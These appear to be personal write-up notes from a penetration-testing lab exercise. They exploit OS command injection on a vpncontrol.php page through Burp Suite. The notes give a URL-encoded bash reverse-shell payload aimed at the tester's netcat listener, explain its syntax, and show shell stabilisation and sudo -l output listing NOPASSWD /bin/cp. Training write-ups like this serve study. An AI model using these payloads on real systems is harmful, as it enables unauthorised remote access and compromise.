## Netcat listener
Create a listener on your Kali Machine.
```
nc -lvnp 1337
```


## Burp Suite OS Command Injection
- Visit http://10.200.X.12/vpncontrol.php. You can get the IP from the VPN connection request.
	- TCPv4_CLIENT link remote: [AF_INET]**10.200.118.12**:1194

- Click on the "Submit" button and send it to Proxy.
- Send the request to "Repeater".
- Add the following code to the request:
```
	+%26%26+bash+-i+>%26+/dev/tcp/<KALI MACHINE IP>/1337+0>%261
```
![[burp_vpn.png]]

- Send the request.
- You'll get a reverse shell on your netccat listener.
	listening on [any] 1337 ...
	connect to [10.50.115.9] from (UNKNOWN) [10.200.118.12] 56484
	bash: cannot set terminal process group (982): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@ip-10-200-118-12:/var/www/html$


### Shell syntax

^a674b9

```
&& bash -i >& /dev/tcp/<KALI MACHINE IP>/1337 0>&1
```

1. `&&`: This is the logical AND operator in shell scripting. It is used to execute the following command (`bash -i ...`) only if the preceding command (`hacker`) succeeds without errors.
    
2. `bash -i`: This is a command to launch a new instance of the Bash shell (`bash`) with the `-i` option, which stands for interactive mode. Interactive mode allows for interactive input and output, typically used when interacting with a terminal.
    
3. `>& /dev/tcp/10.50.115.9/1337`: This portion of the command redirects both standard output (stdout) and standard error (stderr) to a TCP connection established to the specified IP address (`10.50.115.9`) and port (`1337`). This syntax is often used for network communication in shell scripting.
    
4. `0>&1`: This part of the command redirects standard input (stdin) to the same location as standard output (stdout). This can be useful for ensuring that input from the keyboard is also sent over the network connection.
    

In summary, the command appears to be attempting to establish a network connection to the specified IP address and port while also launching an interactive Bash shell.

### Sanitize the shell
**Victim**

```
python -c 'import pty; pty.spawn("/bin/bash")'

ctrl + Z

stty raw -echo;fg
```

## sudoers

^459f9a

```
www-data@ip-10-200-113-12:/var/www/html$ sudo -l

```

User www-data may run the following commands on ip-10-200-113-12:  
(root) NOPASSWD: /home/ubuntu/openvpn-createuser.sh, **/bin/cp**

